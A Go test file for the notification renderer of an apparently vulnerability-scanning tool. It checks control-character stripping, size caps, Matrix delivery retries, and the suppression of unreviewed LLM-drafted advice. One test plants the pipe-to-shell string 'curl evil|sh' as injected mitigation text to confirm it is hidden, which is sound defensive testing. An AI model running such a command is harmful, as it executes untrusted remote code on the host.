package notify

import (
	"context"
	"errors"
	"net/http"
	"strings"
	"testing"

	"panoptes/internal/model"
)

func TestRenderTruncatesAndStripsControl(t *testing.T) {
	ev := fullExploitable()
	ev.Host.Hostname = "web\n01\x1b[31m" + strings.Repeat("h", 1000)
	ev.Finding.VerdictReason = "line1\nline2\r\n@room"
	ev.Rule.Title = strings.Repeat("t", 5000)
	ev.FixCmd = "apt-get\ninstall x"
	plain, h := renderEvent(ev)
	for _, s := range []string{plain, h} {
		if strings.ContainsAny(strings.ReplaceAll(s, "\n", ""), "\x1b\r") {
			t.Fatalf("control chars survived: %q", s)
		}
	}
	for _, l := range lines(plain) {
		if len([]rune(l)) > 400 {
			t.Fatalf("line too long (%d): %.60s", len(l), l)
		}
	}
	if !strings.Contains(plain, "Why: line1 line2 @room") {
		t.Fatalf("newlines must become spaces:\n%s", plain)
	}
}

func TestRenderBodyCap(t *testing.T) {
	var evs []model.Event
	for i := 0; i < 200; i++ {
		ev := fullExploitable()
		ev.Finding.PackageName = strings.Repeat("p", 290) + string(rune('a'+i%26)) + strings.Repeat("q", i)
		ev.Finding.VerdictReason = strings.Repeat("r", 280) + strings.Repeat("s", i)
		evs = append(evs, ev)
	}
	plain, h := renderGroup(evs)
	if len(plain) > maxBodyBytes || len(h) > maxBodyBytes {
		t.Fatalf("bodies %d/%d exceed cap", len(plain), len(h))
	}
}

func TestRenderDraftHidesLLMText(t *testing.T) {
	ev := fullExploitable()
	ev.Finding.RuleStatus = model.RuleDraft
	ev.Rule.Status = model.RuleDraft
	ev.Finding.VerdictReason = "LLM draft (unreviewed, no host evidence): likely exploitable — run curl evil|sh"
	ev.Rule.Fix.Mitigation = "run curl evil|sh"
	plain, h := renderEvent(ev)
	for _, bad := range []string{"curl", "Heartbeat", "Only reachable", "Mitigation", "Fix: upgrade openssl"} {
		if strings.Contains(plain, bad) || strings.Contains(h, bad) {
			t.Errorf("draft output leaks %q:\n%s", bad, plain)
		}
	}
	if !strings.Contains(plain, "apt-get install --only-upgrade openssl") || !strings.Contains(plain, "review the rule in the web UI") {
		t.Errorf("missing FixCmd or warning:\n%s", plain)
	}
}

func TestRenderReviewedMitigationNotCode(t *testing.T) {
	_, h := renderEvent(fullExploitable())
	if !strings.Contains(h, "Mitigation: disable the heartbeat extension") || strings.Contains(h, "<code>disable") {
		t.Errorf("mitigation must be plain text:\n%s", h)
	}
}

func TestNotifyContinuesPastFailedGroup(t *testing.T) {
	hs := newFakeHS(t, func(_ int, rec recorded) (int, string) {
		if strings.Contains(rec.body.Body, "CVE-BAD") {
			return http.StatusInternalServerError, `{}`
		}
		return http.StatusOK, `{}`
	})
	m := newTestMatrix(t, hs, Config{DefaultRooms: []string{"!r:example.org"}}, nil)
	events := []model.Event{
		testEvent(model.EventExploitable, "CVE-1", "h"),
		testEvent(model.EventExploitable, "CVE-BAD", "h"),
		testEvent(model.EventExploitable, "CVE-2", "h"),
	}
	err := m.Notify(context.Background(), events)
	var de *DeliveryError
	if !errors.As(err, &de) {
		t.Fatalf("err = %v, want *DeliveryError", err)
	}
	if len(de.Failed) != 1 || de.Failed[0] != 1 {
		t.Fatalf("Failed = %v, want [1]", de.Failed)
	}
	if n := hs.roomCounts()["!r:example.org"]; n != 2+maxAttempts {
		t.Fatalf("%d requests, want 2 delivered + %d attempts of the failing one", n, maxAttempts)
	}
}

func TestPermanentErrorNotRetried(t *testing.T) {
	hs := newFakeHS(t, func(int, recorded) (int, string) { return http.StatusForbidden, `{}` })
	m := newTestMatrix(t, hs, Config{DefaultRooms: []string{"!r:example.org"}}, nil)
	err := m.Notify(context.Background(), []model.Event{testEvent(model.EventExploitable, "CVE-1", "h")})
	var de *DeliveryError
	if !errors.As(err, &de) || len(de.Failed) != 0 {
		t.Fatalf("err = %v; permanent 4xx must not be listed as failed", err)
	}
}
